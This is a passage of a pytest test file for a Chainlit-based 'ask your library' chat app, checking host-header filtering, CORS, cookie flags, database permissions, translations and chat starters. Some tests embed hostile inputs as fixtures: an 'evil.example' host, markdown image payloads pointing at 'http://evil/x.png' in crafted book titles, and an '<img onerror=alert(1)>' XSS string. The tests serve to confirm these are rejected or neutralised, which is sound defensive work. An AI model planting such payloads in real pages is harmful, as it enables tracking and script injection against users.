    pinned to the loopback pair it served HTTP 400 to every browser that used
    that name — the one thing a reader would have typed.

    `chainlit run --host X` exports X as CHAINLIT_HOST before it loads the
    application module, so the name is the one uvicorn is listening on, and it
    has already been through `launcher.checked_host` (applied again at the
    import below, because this module can be started by hand). A host that is
    NOT the bound one is still 400, which is what closes DNS rebinding.

    In a child: the answer needs a real request, a request builds Starlette's
    middleware stack, and a built stack makes every later `add_middleware` in
    this process — every later import of the module — an error."""
    code = ("from starlette.testclient import TestClient\n"
            "import ask_your_library.ui.app as ui\n"
            "from chainlit.server import app\n"
            "client = TestClient(app)\n"
            "print(ui.ALLOWED_HOSTS)\n"
            "for host in ('books.local', 'evil.example', '127.0.0.1'):\n"
            "    print(client.get('/', headers={'host': host}).status_code)\n")
    allowed, bound, foreign, loopback = _out(
        code, CHAINLIT_HOST="books.local", CHAINLIT_AUTH_SECRET="test-secret",
        AYL_ALLOW_DEFAULT_LOGIN="1", AYL_ALLOW_START_WITHOUT_KEY="1",
        LLM_BACKEND="ollama", EMBED_BACKEND="ollama",
        AYL_CHAINLIT_DIR=str(tmp_path / "chainlit")).splitlines()

    assert allowed == "['localhost', '127.0.0.1', 'books.local']"
    assert bound == loopback == "200"
    assert foreign == "400"


def test_the_bound_host_is_matched_whatever_case_it_was_typed_in(tmp_path):
    """The middleware compares the `Host` header to the list exactly, and a
    browser sends the name lowercased: `ayl ui --host Books.local` answered 400
    to the one name it had been told to serve. The fold happens in
    `checked_host`, so the CORS list gets it too."""
    code = ("from starlette.testclient import TestClient\n"
            "import ask_your_library.ui.app as ui\n"
            "from chainlit.server import app\n"
            "print(ui.ALLOWED_HOSTS)\n"
            "print(TestClient(app).get('/', headers={'host': 'books.local'}).status_code)\n")
    allowed, status = _out(
        code, CHAINLIT_HOST="Books.LOCAL", CHAINLIT_AUTH_SECRET="test-secret",
        AYL_ALLOW_DEFAULT_LOGIN="1", AYL_ALLOW_START_WITHOUT_KEY="1",
        LLM_BACKEND="ollama", EMBED_BACKEND="ollama",
        AYL_CHAINLIT_DIR=str(tmp_path / "chainlit")).splitlines()

    assert allowed == "['localhost', '127.0.0.1', 'books.local']"
    assert status == "200"


def test_an_ipv6_host_refuses_to_start_rather_than_serving_400_to_everyone(tmp_path):
    """The middleware reads the host as `headers["host"].split(":")[0]`, which
    is `[` for the `[::1]:8000` a browser sends. Binding it and then refusing
    every request is the worst of the three options; the refusal says so where
    it can still be acted on."""
    result = _run("import ask_your_library.ui.app", check=False,
                  CHAINLIT_HOST="::1", CHAINLIT_AUTH_SECRET="test-secret",
                  AYL_ALLOW_DEFAULT_LOGIN="1", AYL_ALLOW_START_WITHOUT_KEY="1",
                  LLM_BACKEND="ollama", EMBED_BACKEND="ollama",
                  AYL_CHAINLIT_DIR=str(tmp_path / "chainlit"))
    assert result.returncode != 0
    assert "Host header" in result.stderr and "127.0.0.1" in result.stderr


def test_a_wildcard_bind_adds_no_host_and_a_bad_one_refuses_to_start(monkeypatch, tmp_path):
    """`0.0.0.0` names no host a browser sends, so it adds nothing and the
    loopback pair stands — serving a LAN under a name means passing that name.
    And the value is checked here too: this module can be started by hand, and
    `CHAINLIT_HOST` can come from a `.env` Chainlit loads at its own import."""
    monkeypatch.setenv("CHAINLIT_AUTH_SECRET", "test-secret")
    monkeypatch.setenv("AYL_ALLOW_DEFAULT_LOGIN", "1")
    monkeypatch.setenv("AYL_ALLOW_START_WITHOUT_KEY", "1")
    monkeypatch.setenv("AYL_CHAINLIT_DIR", str(tmp_path / "chainlit"))

    for wildcard in ("0.0.0.0", "::", "::0", ""):
        monkeypatch.setenv("CHAINLIT_HOST", wildcard)
        sys.modules.pop(UI_MODULE, None)
        assert importlib.import_module(UI_MODULE).ALLOWED_HOSTS == ["localhost", "127.0.0.1"]
        sys.modules.pop(UI_MODULE, None)

    monkeypatch.setenv("CHAINLIT_HOST", "not a host")
    sys.modules.pop(UI_MODULE, None)
    with pytest.raises(SystemExit, match="host"):
        importlib.import_module(UI_MODULE)
    sys.modules.pop(UI_MODULE, None)


def test_the_chat_db_is_readable_only_by_its_owner(ui, tmp_path):
    """It holds every question, answer and title of every session. SQLite
    creates it with the process umask (0644 on a default account), unlike the
    auth secret next to it, which has always been 0600."""
    db = tmp_path / "chainlit" / "chat.db"
    assert stat.S_IMODE(db.stat().st_mode) == 0o600
    # journal siblings hold the same text and are narrowed on the next start
    sibling = tmp_path / "chainlit" / "chat.db-wal"
    sibling.write_bytes(b"")
    sibling.chmod(0o644)
    ui.own_read_write_only(db)
    assert stat.S_IMODE(sibling.stat().st_mode) == 0o600


def test_badge_broken_quotes_are_neutralized_and_single_line(ui):
    for blank in BLANK_LINES:
        badge = ui.verification_badge({"verification": "x", "provenance": {
            "checked": 1, "confirmed": 0, "unattributed": 0, "broken": 1, "unused": 0,
            "broken_items": [{"hit_id": "s1h1", "book": "B", "section": "s",
                              "quote": f"line one{blank}![x](http://evil/x.png)"}]}})
        # CRLF is one break, not two, so every form above gives the same two <br>
        assert "line one<br><br>[image removed]" in badge and "![x]" not in badge


# --- chat persistence: the thread insert that carries the title -----------------

CHAINLIT_CONFIG = REPO / "src" / "ask_your_library" / "ui" / "chainlit_config.toml"


def _tags_as_the_emitter_sends_them(profile: str) -> list[str] | None:
    """chainlit.emitter.flush_thread_queues: the insert that saves a chat's title on
    its first message also carries tags=[chat profile] when features.auto_tag_thread
    is on. Read from the repo's config file, not from chainlit's loaded config, so
    the test describes the shipped file whatever the working directory is."""
    features = tomllib.loads(CHAINLIT_CONFIG.read_text(encoding="utf-8"))["features"]
    return [profile] if features.get("auto_tag_thread", True) else None


async def _thread_row(layer, thread_id: str):
    rows = await layer.execute_sql('SELECT "name", "tags" FROM threads WHERE "id" = :id',
                                   {"id": thread_id})
    return rows[0] if rows else None


def _insert_and_read(layer, thread_id: str, tags) -> dict | None:
    """One thread insert through the layer, then the row; the layer's engine is
    disposed in the same loop, so no aiosqlite connection outlives the test."""
    async def go():
        try:
            await layer.update_thread(thread_id=thread_id, name="How many books do I have?",
                                      tags=tags, metadata={})
            return await _thread_row(layer, thread_id)
        finally:
            await layer.close()
    return asyncio.run(go())


def test_first_message_persists_the_chat_title(ui):
    """The data layer as app.py builds it, the schema as app.py creates it, the
    title-carrying insert of a chat's first message with the tags the shipped
    config makes the emitter send (the emitter also passes the user; that
    needs a session and changes nothing about the tags column): the title must
    land in the table the sidebar lists."""
    row = _insert_and_read(ui.data_layer(), "t1", _tags_as_the_emitter_sends_them(ui.PROFILE_EN))
    assert row == {"name": "How many books do I have?", "tags": None}


def test_sqlite_still_rejects_a_tag_list_so_auto_tag_thread_stays_off(ui, caplog):
    """Why the flag is off: the data layer binds the list as-is, SQLite refuses it,
    and execute_sql only logs the failure, so the whole insert, title included,
    is lost. Both halves are pinned: no row, AND the logged reason is the list
    binding (execute_sql swallows every error, so the missing row alone would
    also pass on an unrelated breakage). The day this test fails, upstream
    serializes tags for SQLite and auto_tag_thread can go back on."""
    with caplog.at_level(logging.WARNING, logger="chainlit"):
        row = _insert_and_read(ui.data_layer(), "t2", [ui.PROFILE_EN])
    assert row is None
    assert "type 'list' is not supported" in caplog.text


def test_config_keeps_auto_tag_thread_off():
    features = tomllib.loads(CHAINLIT_CONFIG.read_text(encoding="utf-8"))["features"]
    assert features["auto_tag_thread"] is False, (
        "auto_tag_thread = true loses every chat title on SQLite; see "
        "test_sqlite_still_rejects_a_tag_list_so_auto_tag_thread_stays_off")


def test_config_pins_allow_origins_to_the_serving_port_only():
    """`allow_origins` is the CORS list: which OTHER origins a page may read this
    server's responses from. A port is not part of a site, so the second pair
    (`:8010`) let a page served there read the thread endpoints with the login
    cookie; nothing but this test stops the pair coming back."""
    project = tomllib.loads(CHAINLIT_CONFIG.read_text(encoding="utf-8"))["project"]
    assert project["allow_origins"] == ["http://localhost:8000", "http://127.0.0.1:8000"]


# --- the New Chat dialog: one reworded string, over Chainlit's own file ---------

PROJECT_TRANSLATION = (REPO / "src" / "ask_your_library" / "ui" /
                       "translations" / "en-US.json")
NEW_CHAT_DESCRIPTION = "navigation.newChat.dialog.description"
OUR_WORDING = "This starts a new chat. The current chat stays in your history."
# Every value of the vendored file this project changed, and why it had to be
# changed here rather than in app.py. NOTICE and the README beside the file
# carry the same list in prose (Apache-2.0 §4(b)); this is the enforcement.
STEP_PREFIXES = ("chat.messages.status.used", "chat.messages.status.using")
WATERMARK = "chat.watermark"
OUR_VALUES = {NEW_CHAT_DESCRIPTION: OUR_WORDING,
              "chat.messages.status.used": "",
              "chat.messages.status.using": "",
              WATERMARK: "Evidence provenance is checked in code. The reasoning is not."}


def _leaves(node, path=""):
    """Every string of a translation file, by its dotted path."""
    if not isinstance(node, dict):
        return {path: node}
    found = {}
    for key, value in node.items():
        found.update(_leaves(value, f"{path}.{key}" if path else key))
    return found


def _shipped_translation() -> dict:
    """Chainlit's own en-US.json, from the installed package."""
    from chainlit.config import TRANSLATIONS_DIR
    return json.loads((Path(TRANSLATIONS_DIR) / "en-US.json").read_text(encoding="utf-8"))


def test_the_project_translation_carries_the_whole_key_set_of_the_installed_one():
    """chainlit.config.ChainlitConfig.load_translation returns the file for the
    effective language WHOLE, out of the app root's translations/ alone: there is no
    per-key merge with the package's copy, so a key missing from our file is a
    label missing from the page, not a fallback. The installed en-US.json is the
    ground truth, and the day a Chainlit bump adds or renames a key this fails
    loudly instead of blanking a button."""
    ours = _leaves(json.loads(PROJECT_TRANSLATION.read_text(encoding="utf-8")))
    theirs = _leaves(_shipped_translation())
    assert set(ours) == set(theirs), (
        f"missing: {sorted(set(theirs) - set(ours))}; extra: {sorted(set(ours) - set(theirs))}")


def test_exactly_four_values_are_ours_and_the_rest_stays_upstreams():
    """Four strings are this project's, and each one is a claim app.py cannot
    make for itself:

    - the New Chat warning: chats are persisted by the data layer and stay in
      the sidebar, so "This will clear your current chat history" describes an
      app this is not;
    - the two step prefixes: Chainlit prints "Used"/"Using" in front of a step
      name, and "Used act #1" is a framework log line, not the product's voice.
      Emptied, the name app.py writes is the whole label;
    - the watermark: "LLMs can make mistakes. Check important info." sits under
      a badge reporting a code-only check and says less than this app knows.
      The replacement claims exactly what `validate` does: the provenance of
      the distilled EVIDENCE is checked, not the quotation marks inside the
      answer the model wrote around it.

    The rest has to stay upstream's, or the file is a fork nobody re-reads on a
    bump. en-US only: every other locale falls back to Chainlit's own copy."""
    ours = _leaves(json.loads(PROJECT_TRANSLATION.read_text(encoding="utf-8")))
    theirs = _leaves(_shipped_translation())
    assert {path for path, text in ours.items() if theirs[path] != text} == set(OUR_VALUES)
    assert {path: ours[path] for path in OUR_VALUES} == OUR_VALUES
    assert "clear" not in ours[NEW_CHAT_DESCRIPTION].lower()
    # The watermark must not promise more than validate delivers. It checks the
    # provenance of the evidence items, so the line says "evidence provenance"
    # and not "quotes": a quotation mark inside the written answer is checked by
    # nothing. Both halves are pinned — the claim and its limit.
    assert "Evidence provenance is checked in code" in ours[WATERMARK]
    assert "reasoning is not" in ours[WATERMARK]
    assert "Quotes are checked" not in ours[WATERMARK]


def test_startup_seeds_the_other_languages_and_leaves_ours_alone(tmp_path, monkeypatch):
    """chainlit.config.init_config runs on every import of chainlit.config and
    copies each language the package ships into the app root's translations/ — but
    only where no file exists yet. That `if not os.path.exists(dst)` is the whole
    reason the copy launcher.py puts there survives a start; without it our
    file would be replaced by upstream's on the first `chainlit run`."""
    import shutil
    from chainlit import config as chainlit_config
    project = tmp_path / ".chainlit"
    (project / "translations").mkdir(parents=True)
    shutil.copy(PROJECT_TRANSLATION, project / "translations" / "en-US.json")
    monkeypatch.setattr(chainlit_config, "config_dir", str(project))
    monkeypatch.setattr(chainlit_config, "config_file", str(project / "config.toml"))
    monkeypatch.setattr(chainlit_config, "config_translation_dir", str(project / "translations"))
    chainlit_config.init_config()
    seeded = sorted(path.name for path in (project / "translations").iterdir())
    assert len(seeded) > 1 and "fr-FR.json" in seeded            # the copy step really ran
    after = json.loads((project / "translations" / "en-US.json").read_text(encoding="utf-8"))
    assert after["navigation"]["newChat"]["dialog"]["description"] == OUR_WORDING


def test_the_notice_attributes_the_vendored_chainlit_file():
    """Apache-2.0 §4(b) asks a modified third-party file to carry a notice that
    it was changed, and a file that is upstream's byte for byte except four
    values is exactly that. The file and the paragraph are one contract, so this
    test fails if either side goes: no NOTICE paragraph with a tracked copy, and
    no stale paragraph after the copy is dropped. The version is asserted too —
    a chainlit bump has to be a decision about this copy, not a silent drift
    between what NOTICE names and what the tree holds. Every changed key is
    named in both records, so a fifth one cannot be added in silence."""
    from importlib.metadata import version
    notice = (REPO / "NOTICE").read_text(encoding="utf-8")
    if PROJECT_TRANSLATION.exists():
        assert "src/ask_your_library/ui/translations/en-US.json" in notice
        assert f"Chainlit {version('chainlit')}" in notice
        assert "Apache License" in notice
        readme = (PROJECT_TRANSLATION.parent / "README.md").read_text(encoding="utf-8")
        assert "Apache" in readme
        for path in OUR_VALUES:                    # every value that differs, named in both
            assert path in notice, path
            assert path in readme, path
    else:
        assert "src/ask_your_library/ui/translations/en-US.json" not in notice


# --- the login cookie, in the process shape `chainlit run` really produces ------

def test_the_login_cookie_is_really_strict_under_chainlit_run(tmp_path):
    """CHAINLIT_COOKIE_SAMESITE cannot deliver this. `chainlit run app.py`
    starts at the console script, which imports chainlit.cli; that reaches
    chainlit.auth.cookie (through ensure_jwt_secret) and the module reads the
    variable ONCE, there, before app.py is loaded at all — and a .env entry is
    later still, because load_dotenv runs inside the package import. So app.py
    sets the two module globals the cookie writer reads at request time.

    The child imports in the console script's order, and the assertion is on the
    header a browser would actually receive, not only on the globals."""
    code = (f"import chainlit.cli, {UI_MODULE}\n"
            "import chainlit.auth.cookie as cookie\n"
            "from fastapi import Request, Response\n"
            "response = Response()\n"
            "request = Request({'type': 'http', 'headers': [], 'method': 'GET', 'path': '/'})\n"
            "cookie.set_auth_cookie(request, response, 'token')\n"
            "print(cookie._cookie_samesite, cookie._cookie_secure)\n"
            "print(response.headers['set-cookie'])\n")
    globals_line, header = _out(code, CHAINLIT_AUTH_SECRET="test-secret",
                                AYL_ALLOW_DEFAULT_LOGIN="1", AYL_ALLOW_START_WITHOUT_KEY="1",
                                AYL_CHAINLIT_DIR=str(tmp_path / "chainlit")).splitlines()
    # secure=False is what Chainlit itself computes for strict, and it has to
    # stay False: a Secure cookie is dropped by the browser over plain http.
    assert globals_line == "strict False"
    assert "SameSite=strict" in header and "Secure" not in header and "HttpOnly" in header


# --- the starters on the empty chat screen -------------------------------------

def _books(*keys):
    from ask_your_library.library import BookEntry, author_of, title_of
    return [BookEntry(key, title_of(key), author_of(key), True, True) for key in keys]


def _starters(ui, monkeypatch, books, language="en-US"):
    from ask_your_library import nodes
    monkeypatch.setattr(nodes, "list_books", lambda: books)
    monkeypatch.setattr(ui.cl, "Starter", lambda label, message: (label, message))
    return asyncio.run(ui.chat_starters(None, language))


def test_four_starters_come_from_the_index_that_is_loaded(ui, monkeypatch):
    """The first screen used to teach nothing. It now offers the four
    behaviours the README claims — identify, catalogue, ask-back, refusal — and
    the ask-back one is written from the catalogue, so a clone with its own
    books (or the second index of #58) gets its own question rather than two
    titles this repository hardcoded."""
    starters = _starters(ui, monkeypatch,
                         _books("Dracula — Bram Stoker", "Frankenstein — Mary Shelley"))
    assert len(starters) == 4
    questions = [message for _, message in starters]
    assert "How many books do I have?" in questions
    assert "How does it end — in Dracula, or in Frankenstein?" in questions
    # the identify and refusal questions name no book at all: they read the same
    # on any shelf, which is what lets them survive a change of index
    identify, refusal = questions[0], questions[3]
    for question in (identify, refusal):
        assert "Dracula" not in question and "Frankenstein" not in question


def test_a_crafted_book_title_cannot_load_an_image_from_the_first_screen(ui, monkeypatch):
    """The ask-back starter names two books, and a title comes from a file name:
    "![x](http://evil/x.png)" is one `ayl-add` away. A starter's message becomes
    a user message and is rendered as Markdown with unsafe_allow_html on, so an
    unneutralized title would fetch a third-party URL and plant a tag on the
    first screen a reader ever sees, with no click at all."""
    evil = "![x](http://evil/x.png)<img src=y onerror=alert(1)> — Nobody"
    starters = _starters(ui, monkeypatch, _books(evil, "Dracula — Bram Stoker"))
    message = next(message for _, message in starters if "or in" in message)
    assert "http://evil" not in message and "![" not in message
    assert "[image removed]" in message
    assert "<img" not in message and "&lt;img src=y onerror=alert(1)&gt;" in message


def test_an_empty_index_gets_no_starters_and_one_book_gets_no_ask_back(ui, monkeypatch):
    """A first screen offering questions about books nobody has is worse than an
    empty one; and the ask-back question needs two books to sit between."""
    assert _starters(ui, monkeypatch, []) == []
    one = _starters(ui, monkeypatch, _books("Dracula — Bram Stoker"))
    assert len(one) == 3 and all("or in" not in message for _, message in one)


def test_an_unreadable_catalogue_is_an_empty_first_screen_not_a_failed_request(ui, monkeypatch):
    """No index yet is the normal state of a fresh clone. The reader gets the
    screen they would have got anyway, and `on_chat_start`'s preflight is what
    tells them what is wrong."""
    from ask_your_library import nodes
    monkeypatch.setattr(nodes, "list_books", lambda: (_ for _ in ()).throw(RuntimeError("no index")))
    monkeypatch.setattr(ui.cl, "Starter", lambda label, message: (label, message))
    assert asyncio.run(ui.chat_starters(None, "en-US")) == []


def test_the_starters_follow_the_interface_language_not_the_process_default(ui, monkeypatch):
    """`set_starters` is answered before a chat session exists, so the chat
    profile that carries the session language has not been picked yet: Chainlit
    hands over the interface language instead, and the process default is left
    as it was found."""
    from ask_your_library.i18n import get_lang

    before = get_lang()
    ukrainian = _starters(ui, monkeypatch, _books("Dracula — Bram Stoker",
                                                  "Frankenstein — Mary Shelley"),
                          language="uk-UA")
    assert "Скільки в мене книжок?" in [message for _, message in ukrainian]
    assert get_lang() == before
    assert ui.starter_language("fr-FR") == ui.LANG        # a language this project does not speak


# --- on_chat_start: plain-markdown messages, and the db siblings ---------------

def _chat_start(ui, monkeypatch, problems=(), notices=()) -> list[str]:
    """on_chat_start against a stubbed session and message bus; returns what it
    sent. check_environment is replaced, so no network and no index are needed."""
    from ask_your_library.preflight import PreflightResult

    store = {}
    session = type("S", (), {"get": staticmethod(lambda k: store.get(k)),
                             "set": staticmethod(lambda k, v: store.__setitem__(k, v))})()
    monkeypatch.setattr(ui.cl, "user_session", session)
    sent = []

    class Msg:
        def __init__(self, content, **kw):
            sent.append(content)

        async def send(self):
            return None

    def as_async(function):
        async def call(*args, **kwargs):
            return function(*args, **kwargs)
        return call

    monkeypatch.setattr(ui.cl, "Message", Msg)
    monkeypatch.setattr(ui.cl, "make_async", as_async)
    monkeypatch.setattr(ui, "check_environment", lambda: PreflightResult(problems, notices))
    asyncio.run(ui.on_chat_start())
    return sent


def test_the_preflight_message_is_still_a_markdown_list(ui, monkeypatch):
    """It is a plain-markdown message, not one of our HTML blocks: safe_html
    turned each newline into a <br>, and "- item" lines rendered as one
    paragraph of literal dashes. Escaping and image neutralization are the whole
    job here — the line breaks ARE the list."""
    sent = _chat_start(ui, monkeypatch,
                       problems=["Ollama is not answering", "no index at ![p](http://x/y.png)"])
    assert len(sent) == 1 and "<br>" not in sent[0]
    assert sent[0].count("\n- ") == 2
    assert "[image removed]" in sent[0] and "y.png" not in sent[0]


def test_a_notice_keeps_its_list_and_is_the_only_thing_sent(ui, monkeypatch):
    """A non-fatal notice is still a markdown list. It is also the ONLY message
    a healthy-enough chat start sends: the welcome line that used to follow it
    was what kept Chainlit's welcome screen — and the starters on it — from
    being drawn at all."""
    sent = _chat_start(ui, monkeypatch, notices=["the cards table is missing"])
    assert len(sent) == 1 and "<br>" not in sent[0]
    assert sent[0].endswith("\n- the cards table is missing")


def test_a_healthy_chat_start_sends_nothing_into_the_chat(ui, monkeypatch):
    """Chainlit draws its welcome screen only while the thread has no message,
    so the four starters cost exactly one thing: not writing a welcome message
    over them."""
    assert _chat_start(ui, monkeypatch) == []


def test_a_chat_start_narrows_the_journal_siblings_too(ui, monkeypatch, tmp_path):
    """The import pass narrows what exists at import time, but -wal and -journal
    hold the same questions and answers and are created with the process umask
    when the data layer opens the db for a session, i.e. later. on_chat_start
    runs the pass again — before the preflight, so the path that reports
    problems and returns narrows them as well."""
    sibling = tmp_path / "chainlit" / "chat.db-wal"
    sibling.write_bytes(b"")
    sibling.chmod(0o644)
    _chat_start(ui, monkeypatch, problems=["Ollama is not answering"])
    assert stat.S_IMODE(sibling.stat().st_mode) == 0o600


# --- the scripted-backend seam, in the process shape `chainlit run` produces ---

def test_a_scripted_backend_without_its_confirmation_refuses_to_serve(tmp_path):
    """The seam that lets tests/ui start a server with no model and no index
    (`ask_your_library.fake_backend`) needs two variables, and the refusal is
    what makes one of them safe to have in a shell: a path alone stops the
    server from coming up, rather than quietly serving scripted answers.

    Asserted in a child, at app.py's own import, because that is where the call
    sits and where an operator would meet it."""
    script = tmp_path / "backend.py"
    script.write_text("def install():\n    raise AssertionError('this must never run')\n")
    result = _run(f"import {UI_MODULE}", check=False,
                  CHAINLIT_AUTH_SECRET="test-secret", AYL_ALLOW_DEFAULT_LOGIN="1",
                  AYL_ALLOW_START_WITHOUT_KEY="1", AYL_CHAINLIT_DIR=str(tmp_path / "chainlit"),
                  AYL_UI_FAKE_BACKEND=str(script))
    assert result.returncode != 0
    assert "AYL_UI_FAKE_BACKEND_CONFIRM" in result.stderr
    assert "this must never run" not in result.stderr        # the file was never executed


def test_the_clarify_timeout_is_five_minutes_unless_a_test_shortens_it(tmp_path):
    """ui.CLARIFY_TIMEOUT_SECONDS is what an unanswered ask-back waits for. The
    default is the reader's five minutes; AYL_CLARIFY_TIMEOUT_S exists so the UI
    smoke test can watch one expire. A nonsense value is refused, not rounded:
    a server whose clarify expires immediately looks like a model that never
    asks. Digits only, surrounding whitespace ignored — `int()` would also read
    `1_0` as ten, which is a typo to everyone but Python."""
    environment = dict(CHAINLIT_AUTH_SECRET="test-secret", AYL_ALLOW_DEFAULT_LOGIN="1",
                       AYL_ALLOW_START_WITHOUT_KEY="1", AYL_CHAINLIT_DIR=str(tmp_path / "chainlit"))
    code = f"import {UI_MODULE} as ui; print(ui.CLARIFY_TIMEOUT_SECONDS)"
    assert _out(code, **environment) == "300"
    assert _out(code, **environment, AYL_CLARIFY_TIMEOUT_S="25") == "25"
    assert _out(code, **environment, AYL_CLARIFY_TIMEOUT_S=" 25 ") == "25"   # a .env keeps its spaces
    # Blank is absent, as everywhere else in this project (a copied .env.example
    # line): the default stands rather than the server refusing to start.
    assert _out(code, **environment, AYL_CLARIFY_TIMEOUT_S="  ") == "300"
    # "²" is isdigit() and not int()-able: the parser matches ASCII digits.
    for bad in ("0", "-1", "soon", "1_0", "+5", "2.5", "25s", "²", "٢٥"):
        result = _run(code, check=False, **environment, AYL_CLARIFY_TIMEOUT_S=bad)
        assert result.returncode != 0 and "AYL_CLARIFY_TIMEOUT_S" in result.stderr


# --- the browser smoke run's own gate, without a browser ----------------------

def _pytest_on_the_smoke_directory(browsers_dir, **environment) -> subprocess.CompletedProcess:
    """Collect tests/ui in a child, with the browser made unfindable. Nothing is
    launched: the module's own probe answers at collection time."""
    base = {k: v for k, v in os.environ.items() if k != "AYL_UI_SMOKE_REQUIRED"}
    base["PLAYWRIGHT_BROWSERS_PATH"] = str(browsers_dir)
    return subprocess.run([sys.executable, "-m", "pytest", "-q", "tests/ui", "-rs",
                           "-p", "no:cacheprovider"],
                          cwd=REPO, env={**base, **environment},
                          capture_output=True, text=True)


def test_the_smoke_run_skips_by_default_and_is_an_error_where_ci_requires_it(tmp_path):
    """tests/ui skips itself wherever chromium is missing, which is what keeps
    `uv run pytest -q` green and fast on a clone that never ran `playwright
    install` — and is exactly the wrong answer in the job whose only purpose is
    that file, where it would turn a release check that stopped running into a
    green tick. AYL_UI_SMOKE_REQUIRED=1, set in the `ui-smoke` job and nowhere
    else, makes the missing browser a collection error instead.

    Both halves are asserted in a child interpreter with the browser path
    pointed at an empty directory, so the test needs no browser itself."""
    pytest.importorskip("playwright", reason="the smoke directory's own gate needs the library")
    empty = tmp_path / "no-browsers-here"
    empty.mkdir()

    skipped = _pytest_on_the_smoke_directory(empty)
    # 5 is pytest's "no tests ran": this child collects nothing else. In the real
    # `uv run pytest -q` the rest of the suite runs and the status is 0 — what
    # matters here is that a missing browser is not a failure.
    assert skipped.returncode == 5, skipped.stdout[-2000:]
    assert "chromium is not installed" in skipped.stdout          # -rs prints the reason
    assert "1 skipped" in skipped.stdout

    required = _pytest_on_the_smoke_directory(empty, AYL_UI_SMOKE_REQUIRED="1")
    assert required.returncode != 0, required.stdout[-2000:]
    output = required.stdout + required.stderr
    assert "AYL_UI_SMOKE_REQUIRED=1" in output and "chromium is not installed" in output
    assert "skipped" not in required.stdout.splitlines()[-1]
